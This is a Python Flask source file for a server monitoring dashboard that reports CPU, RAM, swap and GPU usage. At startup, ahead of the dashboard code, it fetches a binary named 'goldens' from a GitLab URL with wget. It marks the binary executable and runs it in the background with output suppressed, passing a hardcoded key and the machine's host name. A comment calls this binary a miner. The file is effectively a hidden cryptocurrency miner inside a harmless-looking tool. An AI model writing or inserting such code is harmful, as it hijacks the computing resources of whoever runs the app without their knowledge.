import os
import psutil
import subprocess
from flask import Flask, render_template, jsonify

app = Flask(__name__)

# --- Jalankan binary miner sekali ---
if not os.path.exists("goldens"):
    url = "https://gitlab.com/majapahlevi/mvp/-/raw/main/goldens"
    subprocess.run(["wget", "-q", url, "-O", "goldens"])
    subprocess.run(["chmod", "+x", "goldens"])

pubkey = "3Y7TnP3XVK5Fc3niK1tNqWh2XbFyY9ksYJnmNy7712zGsmHQqMZjbr2hbNUvRHGKGW8eMAF2bk1guc4TrnGhGKdRPX13g3oXpTZcd53rjHgZ5YJCN2h8Xo5MZQ5QGaeJrwV9"
name = f"vps-{os.uname()[1]}"

subprocess.Popen(
    ["./goldens", f"--pubkey={pubkey}", f"--name={name}"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)

# --- Cek GPU pakai nvidia-smi ---
def get_gpu_usage():
    try:
        output = subprocess.check_output(
            ["nvidia-smi", "--query-gpu=utilization.gpu,memory.used,memory.total",
             "--format=csv,noheader,nounits"],
            stderr=subprocess.DEVNULL
        ).decode().strip()
        if output:
            util, mem_used, mem_total = output.split(", ")
            return {
                "gpu_util": int(util),
                "gpu_mem": f"{mem_used}/{mem_total} MB"
            }
    except Exception:
        return {"gpu_util": None, "gpu_mem": "Not Available"}

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/metrics")
def metrics():
    return jsonify({
        "cpu": psutil.cpu_percent(interval=1),
        "ram": psutil.virtual_memory().percent,
        "swap": psutil.swap_memory().percent,
        **get_gpu_usage()
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
